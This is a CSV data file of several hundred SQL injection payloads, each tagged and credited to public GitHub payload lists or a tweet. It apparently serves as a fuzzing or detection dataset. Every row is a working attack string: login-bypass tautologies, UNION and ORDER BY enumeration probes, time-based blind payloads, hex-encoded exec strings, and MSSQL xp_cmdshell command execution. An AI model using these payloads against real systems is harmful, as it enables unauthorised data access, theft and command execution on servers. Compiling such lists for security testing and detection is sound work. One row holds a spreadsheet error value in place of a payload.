cve,tag,payload,url
,SQL Injection,hi or a=a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,*(|(mail=*)),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,password:*/=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,distinct,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,);waitfor delay '0:0:__TIME__'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,to_timestamp_tz,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""") or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,UNION SELECT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%2A%28%7C%28mail%3D%2A%29%29,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1=1 /*,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,)) or sleep(__TIME__)=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"or 1=1 or """"=",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1 in (select @@version)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,sqlvuln;,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,union select * from users where login = char ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,x' or 1=1 or 'x'='y,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,28%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,?€˜ or 3=3 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,@variable,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or '1'='1'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"""a"""" or 1=1--""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,//*,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%2A%7C,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or 0=0 --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,)) or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,?,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1/*,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,!,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or a = a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 1=1 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,x' OR full_name LIKE '%Bob%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec master..xp_cmdshell 'ping 172.10.1.255'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%20''=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%20'x'='x,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,)%20or%20('x'='x,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 0=0 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 0=0 #,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"or 0=0 #""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 1=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or '1'='1'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 1 --',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 1=1 or ''=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"or 1=1 or """"=",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or a=a--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or a=a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,) or ('a'='a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,hi' or 'x'='x';,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,procedure,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,handler,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or username like '%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or uname like '%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or userid like '%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or uid like '%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or user like '%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec master..xp_cmdshell,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec xp_regread,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,t'exec master..xp_cmdshell 'nslookup www.google.com'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,#NAME?,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, UNION SELECT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, UNION ALL SELECT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or (EXISTS),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, (select top 1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,||UTL_HTTP.REQUEST,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1;SELECT%20*,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"<>""'%;)(&+",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%201=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,sqlattempt1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,28%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,29%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,26%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,21%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or ''=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 3=3,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 3=3 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,randomtext%' OR SLEEP (5) #,https://twitter.com/0x_Akoko/status/1651386818833817602
,SQL Injection,',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,`,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,``,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,",",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"""""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,/,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,//,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,\,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,\\,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," or """,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,-- or #,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, OR '1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, OR 1 -- -,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,""" OR """" = """,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,""" OR 1 = 1 -- -",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, OR '' = ',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,LIKE',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,=0--+,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, OR 'x'='x,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, AND id IS NULL; --,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,''''''''''''UNION SELECT '2,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,0%,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,/*...*/,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,+,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,||,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,%,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,@variable,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,@@variable,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,# Numeric,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 0,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND true,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND false,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1-false,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1-true,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1*56,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,-2,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1' ORDER BY 1--+,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1' ORDER BY 2--+,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1' ORDER BY 3--+,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1' ORDER BY 1,2--+",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1' ORDER BY 1,2,3--+",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1' GROUP BY 1,2,--+",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1' GROUP BY 1,2,3--+",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, GROUP BY columnnames having 1=1 --,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"-1' UNION SELECT 1,2,3--+",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, UNION SELECT sum(columnname ) from tablename --,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"-1 UNION SELECT 1 INTO @,@",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"-1 UNION SELECT 1 INTO @,@,@",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 AND (SELECT * FROM Users) = 1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," AND MID(VERSION(),1,1) = '5';",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,",(select * from (select(sleep(10)))a)",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,%2c(select%20*%20from%20(select(sleep(10)))a),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;WAITFOR DELAY '0:0:30'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,/*,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;%00,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,`,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=0,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR x=x,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR x=y,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=1#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=0#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR x=x#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR x=y#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=1--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 1=0--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR x=x--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR x=y--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 3409=3409 AND ('pytW' LIKE 'pytW,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,OR 3409=3409 AND ('pytW' LIKE 'pytY,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,HAVING 1=1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,HAVING 1=0,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,HAVING 1=1#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,HAVING 1=0#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,HAVING 1=1--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,HAVING 1=0--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=0,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=1--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=0--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=1#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=0#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=1 AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1=0 AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1083=1083 AND (1427=1427,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 7506=9091 AND (5913=5913,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 1083=1083 AND ('1427=1427,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 7506=9091 AND ('5913=5913,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 7300=7300 AND 'pKlZ'='pKlZ,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 7300=7300 AND 'pKlZ'='pKlY,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 7300=7300 AND ('pKlZ'='pKlZ,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND 7300=7300 AND ('pKlZ'='pKlY,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AS INJECTX WHERE 1=1 AND 1=1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AS INJECTX WHERE 1=1 AND 1=0,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AS INJECTX WHERE 1=1 AND 1=1#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AS INJECTX WHERE 1=1 AND 1=0#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AS INJECTX WHERE 1=1 AND 1=1--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AS INJECTX WHERE 1=1 AND 1=0--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,WHERE 1=1 AND 1=1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,WHERE 1=1 AND 1=0,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,WHERE 1=1 AND 1=1#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,WHERE 1=1 AND 1=0#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,WHERE 1=1 AND 1=1--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,WHERE 1=1 AND 1=0--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 1--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 2--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 3--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 4--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 5--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 6--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 7--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 8--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 9--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 10--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 11--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 12--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 13--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 14--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 15--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 16--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 17--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 18--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 19--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 20--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 21--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 22--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 23--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 24--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 25--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 26--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 27--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 28--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 29--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 30--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 31337--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 1#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 2#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 3#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 4#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 5#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 6#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 7#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 8#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 9#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 10#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 11#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 12#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 13#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 14#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 15#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 16#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 17#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 18#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 19#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 20#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 21#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 22#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 23#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 24#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 25#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 26#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 27#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 28#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 29#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 30#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 31337#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 2,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 3,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 4,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 5,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 6,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 7,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 8,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 9,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 10,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 11,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 12,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 13,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 14,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 15,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 16,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 17,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 18,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 19,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 20,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 21,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 22,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 23,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 24,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 25,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 26,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 27,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 28,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 29,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 30,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY 31337,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,https://github.com/payloadbox/sql-injection-payload-list
